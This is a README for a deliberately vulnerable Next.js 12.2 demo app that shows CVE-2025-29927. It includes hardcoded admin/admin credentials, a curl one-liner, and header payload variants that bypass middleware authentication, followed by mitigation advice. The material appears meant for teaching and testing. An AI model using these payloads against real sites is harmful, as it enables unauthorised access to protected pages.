# Hello World - Next.js 12.2

A simple proof of concept Next.js 12.2 application.

## 🚀 Quick Start

### 1. Install Dependencies
```bash
npm install
```

### 2. Run the Development Server
```bash
npm run dev
```

The application will be available at `http://localhost:3000`

## 📁 Project Structure

```
├── pages/
│   ├── _app.js          # App wrapper component
│   ├── index.js         # Home page with navigation
│   ├── login.js         # Login page with hardcoded credentials
│   └── admin.js         # Protected admin dashboard
├── middleware.js        # Vulnerable authentication middleware
├── exploit.js           # Exploit demonstration script
├── package.json         # Dependencies and scripts
├── next.config.js       # Next.js configuration
└── README.md           # This file
```

## 🛠️ Available Scripts

- `npm run dev` - Start development server
- `npm run build` - Build for production
- `npm run start` - Start production server

## 🎯 Features

- ✅ **Next.js 12.2** - Latest stable version
- ✅ **React 18.2** - Modern React features
- ✅ **Simple Design** - Clean, responsive UI
- ✅ **Authentication System** - Login with hardcoded credentials
- ✅ **Admin Panel** - Protected dashboard with sensitive data
- ✅ **Vulnerable Middleware** - Demonstrates auth bypass techniques
- ✅ **Exploit Demo** - Easy to reproduce security issues

## 🔧 Customization

Edit `pages/index.js` to modify the Hello World page. The application uses inline styles for simplicity, but you can add CSS files or styling libraries as needed.

## 🔓 CVE-2025-29927 Security Demo

This application demonstrates the **CVE-2025-29927** vulnerability discovered by Rachid.A (zhero) and Yasser Allam (inzo_):

### 📋 Vulnerability Details
- **CVE:** CVE-2025-29927
- **CVSS:** 9.1/10 (Critical)
- **Affected:** Next.js 11.1.4 - 15.2.2
- **Impact:** Complete middleware bypass using `x-middleware-subrequest` header

### 🎯 Demo Credentials
- **Username:** `admin`
- **Password:** `admin`

### 🚨 CVE-2025-29927 Exploit Methods
1. **Browser Extension (ModHeader)** - Add `x-middleware-subrequest: middleware` header
2. **JavaScript Console** - Use fetch with the bypass header
3. **cURL Exploit** - `curl -H "x-middleware-subrequest: middleware" http://localhost:3000/admin`
4. **Python Requests** - Add header to bypass middleware completely

### 🔧 Payload Variations
- **Next.js 12.2+:** `x-middleware-subrequest: middleware`
- **With /src directory:** `x-middleware-subrequest: src/middleware`
- **Next.js 15.x:** `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware`


### 🛡️ Mitigation
- Update to Next.js 15.2.3+ (14.2.25+ for 14.x)
- Block `x-middleware-subrequest` header at proxy/CDN level
- Implement additional server-side validation

**⚠️ WARNING: This demonstrates a real CVE for educational purposes only!**

## 📦 Dependencies

- **next**: 12.2.0
- **react**: 18.2.0
- **react-dom**: 18.2.0

## 🎨 Styling

This application uses inline styles for simplicity. For a production app, consider using:
- CSS Modules
- Styled Components
- Tailwind CSS
- Or any other styling solution

---

**Happy coding! 🚀** 
